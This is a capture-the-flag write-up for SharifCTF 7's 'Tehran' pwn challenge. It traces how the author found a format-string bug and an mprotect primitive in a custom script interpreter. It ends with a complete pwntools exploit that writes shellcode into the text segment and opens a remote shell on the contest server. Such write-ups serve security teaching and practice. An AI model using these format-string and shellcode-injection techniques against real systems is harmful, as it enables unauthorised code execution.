---
layout: post
title: "SharifCTF 7: Tehran (pwn 400)"
author: f0rki
categories: writeup
tags: [cat/pwn, tool/radare]
---

* **Category:** pwn
* **Points:** 400
* **Description:**

> We live in Tehran city.
>
> `nc ctf.sharif.edu 54515`

## Write-up

The binary we are given is pretty big and contains a lot of functions that are
hard to figure out what they are doing. So first I tried to figure out what the
binary is doing with dynamic analysis.

```
$ ltrace -C -i ./tehran
[..]
[0x804b807] malloc(262144)                                        = 0xf74e8008
[0x804b830] malloc(262144)                                        = 0xf74a7008
[0x804b859] malloc(262144)                                        = 0xf7466008
[0x804b882] malloc(262144)                                        = 0xf7425008
[0x804b8b5] memset(0xf74e8008, '\0', 262144)                      = 0xf74e8008
[0x804b8d0] memset(0xf74a7008, '\0', 262144)                      = 0xf74a7008
[0x804b8eb] memset(0xf7466008, '\0', 262144)                      = 0xf7466008
[0x804b906] memset(0xf7425008, '\0', 262144)                      = 0xf7425008
[0x804b9b5] malloc(262144)                                        = 0xf73e4008
[0x804b6d6] calloc(1, 1)                                          = 0x9c5b008
[0x804b773] fgets(asdfasdf
"asdfasdf\n", 1024, 0xf76de580)                                   = 0xffb7ad8c
[0x804b6e9] strlen("")                                            = 0
[0x804b6fd] strlen("asdfasdf\n")                                  = 9
[0x804b711] realloc(0x9c5b008, 10)                                = 0x9c5b008
[0x804b73b] strstr("asdfasdf\n", "EOF")                           = nil
[0x804b756] strcat("", "asdfasdf\n")                              = "asdfasdf\n"
[0x804b773] fgets(asdfasdfasdf
"asdfasdfasdf\n", 1024, 0xf76de580)                               = 0xffb7ad8c
[0x804b6e9] strlen("asdfasdf\n")                                   = 9
[0x804b6fd] strlen("asdfasdfasdf\n")                               = 13
[0x804b711] realloc(0x9c5b008, 23)                                 = 0x9c5b008
[0x804b73b] strstr("asdfasdfasdf\n", "EOF")                        = nil
[0x804b756] strcat("asdfasdf\n", "asdfasdfasdf\n")                 = "asdfasdf\nasdfasdfasdf\n"
[0x804b773] fgets("asdfasdfasdf\n", 1024, 0xf76de580)              = 0
[0x804b9f8] strlen("asdfasdf\nasdfasdfasdf\n")                     = 22
[0x804af22] exit(-1 <no return ...>
```

OK so we can basically input as many lines as we want and the buffer is
grown to fit our input. `strcat` is ususually a red flag, but in this case it's
usage is safe. This input stuff all happens in a function starting at 
`0x0804b6c0`, which I called `read_user_input`. Other than doing that there is
nothing interesting here. We can also end the input function by sending the
string `EOF`.

We can see that the call to exit comes from somewhere deep inside the program
`0x804af22`. I tried to understand what's going on there, but the I quickly
moved on, because it seemd pretty hard to understand.

A more intersting and easier to understand function is `0x0804afef`, which is
called at the end of the main function. This is also a huge function but has a
much more clearer structure. If one looks at the control flow graph of this
function from far away, it is clear that this functions consists of one huge
switch case inside of a loop.

Let's take a look:


```
 ┌─────────────────────────────┐     ┌──────────────────────────────────┐
 │  0x804b276 ;[Am]            │     │  0x804b297 ;[Al]                 │
 │ mov eax, dword [0x804c19c]  │     │ cmp dword [ebp - local_1ch], 0xf │
 │ lea edx, [eax + 4]          │     │ jne 0x804b2be ;[An]              │
 │ mov dword [0x804c19c], edx  │     └──────────────────────────────────┘
 │ mov edx, dword [eax]        │             f t
 │ mov eax, dword [0x804c188]  │             │ │
 │ or eax, edx                 │             │ │
 │ mov dword [0x804c188], eax  │             │ │
 │ jmp 0x804b6a3 ;[d]──────────│─────────────┘ └─┐
 └─────────────────────────────┘                 │
     v         │                                 │
 ┌───┘         │                                 │
 │             │                                 │
 │             │                                 │
 │     ┌─────────────────────────────┐     ┌───────────────────────────────────┐
 │     │  0x804b29d ;[Ao]            │     │  0x804b2be ;[An]                  │
 │     │ mov eax, dword [0x804c19c]  │     │ cmp dword [ebp - local_1ch], 0x10 │
 │     │ lea edx, [eax + 4]          │     │ jne 0x804b2e5 ;[Ap]               │
 │     │ mov dword [0x804c19c], edx  │     └───────────────────────────────────┘
 │     │ mov edx, dword [eax]        │             f t
 │     │ mov eax, dword [0x804c188]  │             │ │
 │     │ xor eax, edx                │             │ │
 │     │ mov dword [0x804c188], eax  │             │ │
 │     │ jmp 0x804b6a3 ;[d]──────────│─────────────┘ └─┐
 │     └─────────────────────────────┘                 │
 │         v         │                                 │
 │     ┌───┘         │                                 │
 │     │             │                                 │
 │     │             │                                 │
 │     │     ┌─────────────────────────────┐     ┌───────────────────────────────────┐
 │     │     │  0x804b2c4 ;[Aq]            │     │  0x804b2e5 ;[Ap]                  │
 │     │     │ mov eax, dword [0x804c19c]  │     │ cmp dword [ebp - local_1ch], 0x11 │
 │     │     │ lea edx, [eax + 4]          │     │ jne 0x804b312 ;[Ar]               │
 │     │     │ mov dword [0x804c19c], edx  │     └───────────────────────────────────┘
 │     │     │ mov edx, dword [eax]        │             f t
 │     │     │ mov eax, dword [0x804c188]  │             │ │
 │     │     │ and eax, edx                │             │ │
 │     │     │ mov dword [0x804c188], eax  │             │ │
 │     │     │ jmp 0x804b6a3 ;[d]──────────│─────────────┘ └─┐
 │     │     └─────────────────────────────┘                 │
```


We can see that the three blocks shown here are basically the same, except for
one little detail: the operation that combines `eax` and `edx`. That's when it
hit me: this is some kind of interpreter. On the right we can see the 1 byte
opcodes and on the left are the opcode handler blocks. 

Maybe this thing is some kind of interpreter for a scripting language. This
would explain the weird code that is called in between. This is probably some
kind of recursive parser. Generated parser code tends to be pretty unreadable.

Then I checked for strings in the binary, which confirmed my suspicion:

```
vaddr=0x0804bb80 paddr=0x00003b80 ordinal=041 sz=27 len=26 section=.rodata type=ascii string=Can't escape your sandbox.
vaddr=0x0804bb9b paddr=0x00003b9b ordinal=042 sz=9 len=8 section=.rodata type=ascii string=exit(%d)

vaddr=0x0804bbbc paddr=0x00003bbc ordinal=046 sz=117 len=116 section=.rodata type=ascii string=char ex_case typedefs if number ret sz while print println printout puts heap_create fillout compare exit void begin
vaddr=0x0804bc31 paddr=0x00003c31 ordinal=047 sz=22 len=21 section=.rodata type=ascii string=Where's your begin()?
```

The one string looks like a list of keywords and the other one is printed in
the main function, right before the call to opcode interpreter. So I tried
several inputs that kind of look like scripting languages, and after some time
I managed to get some valid inputs.

```
begin(){
print("hello");
exit(42);

}

EOF
```

But this didn't print the expected string, but the string `"Iran"`. I tried all
the variations of `print` functions that are present in the keyword string.
Most of them are pretty useless except for `puts`, which is mapped directly to
a call to `printf`.

Now that's interesting. We have a format string vulnerability here

```
$ ./tehran
begin() {
    puts("ABAB.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.");

}


EOF
ABAB.(nil).(nil).(nil).(nil).(nil).0xff9b9748.0x804afd0.0xf76ef000.0x40000.0xf74b6ff0.0x21.0xff9b97a0.0xf76ef000.0xff9b9758.0xff9b97a0.0x8b19008.0xf76ef000.0xff9b9788.0x804bade.0x1.0xff9b9834.0xf74b7000.0x26.0x1.0xff9b9834.0xff9b983c.0xff9b97a0.(nil).0x1.(nil).0xf7552196.0x1.0xf76ef000.(nil).0xf7552196.0x1.0xff9b9834.0xff9b983c.(nil).(nil).(nil).0xf76ef000.0xf7732be4.0xf7731fcc.(nil).0x1.0xf76ef000.(nil).0xcfde1ff0.0x52b3f3e1.(nil).(nil).(nil).0x1.0x8048620.(nil).0xf7723e40.0xf75520a9.0xf7731fcc.0x1.0x8048620.(nil).0x8048641.0x804b786.0x1.0xff9b9834.0x804baf0.exit(566)
```

I dumped the contents of the stack this way, but couldn't find the format
string itself on the stack. This makes it considerably harder to exploit format
string vulnerabilities... At this point I went to bed. The next day a colleaque
alerted me to the presence of the call to `mprotect` in the interpreter function.
This is promising, maybe we can somehow make a buffer we control executable and the inject
shellcode. Question is how to trigger this and how to hijack the control flow of the program.

I played around a little more with the syntax and tried to produce valid programs for this language.


- `print();` prints "Iran"
- `printout();` prints "Islamic"
- `println();` prints "Teheran"
- `printf` trigger the `"Can't escape your sandbox."` in the parser
  - Apparently calling undefined functions triggers this error
- `compare` is mapped to `memcmp`
- Apparently if we omit args to function calls, they are still fetched from 
  wherever they are ususally passed, resulting in use of 
- `heap_create` is mapped to malloc
  - We can calculate with the return address of `heap_create`
  - We can use this to leak pointers to the heap (with `exit` or `puts`)
  - I noticed that ASLR is disabled on their server
- Finally I noticed `fillout()` is mapped to `mprotect()`

Now that last part is interesting. So we can directly call `mprotect` with
parameters we specify.

```
$ ltrace -i -C ./tehran
[...]
begin() {
    fillout(0x1337, 0x42, 10);
}
[..]

[0x804b658] mprotect(4919, 66, 10, 0x804afd0)         = 0xffffffff
[0x804b530] printf("exit(%d)", -1exit(-1))            = 8
```

I confirmed in the debugger that we can change the memory protections of any segment this way.
With the follwing snippet, we can make the text and heap sections `RWX`

```
begin(){
    fillout(0x8048000, 16384, 7);
    fillout(heap_create(1) & 0xfffff000, 21000, 7);
}
```

So that's already pretty good. We can put shellcode on the heap and make it
executable, but I was still puzzeled on how to hijack control flow. Then I
realized that I missed something pretty obvious: we can just write to the text
section and overwrite some instructions using the format string in `puts` 
(actually `printf`).

I whipped together the following poc, which I confirmed in the debugger.

```
begin() {
    puts("%x\n\n", heap_create(10));
    puts("%s\n\n", heap_create(10) - 500);
    fillout(0x8048000, 16384, 7);
    fillout(heap_create(1) & 0xfffff000, 21000, 7);

    puts("%65c%hn", 42, 0x8048000);
    puts("%66c%hn", 42, 0x8048001);

}
```

Then it was just a matter of writing all of the shellcode at the right address.
I chose to write it directly after the call to the interpreter function in
main. When debugging this, you need to make sure, your breakpoints are not
interfering with the shellcode you wrote (or the other way around). This gives
us a nice shell we can enjoy :)

```python
from pwn import *  # NOQA

velf = ELF("./tehran")

gdbscript = """
init-pwndbg
# break *0x0804afef
break *0x0804b6af
# break *0x0804b6ae
"""
# vp = process("./tehran")
# gdb.attach(vp, gdbscript)

vp = remote("ctf.sharif.edu", 54515)

script = """
begin() {
"""

# first make code segment writable
script += "fillout(0x8048000, 16384, 7);\n"

# start writing shellcode here
start_addr = 0x0804bade - 1

sc = shellcraft.i386.linux.sh()
log.info("using shellcode:\n" + sc)
sc = "\x90" * 5 + asm(sc)
log.info(hexdump(sc))

addr = start_addr
for byte in sc:
    fmt = "%{}c%hn".format(ord(byte))
    puts = "puts(\"{}\", 42, 0x{:x});\n".format(fmt, addr)
    addr += 1
    script += puts

script += "\n}\n\nEOF\n"

log.info("using script\n" + script)

vp.sendline(script)

vp.interactive()
```
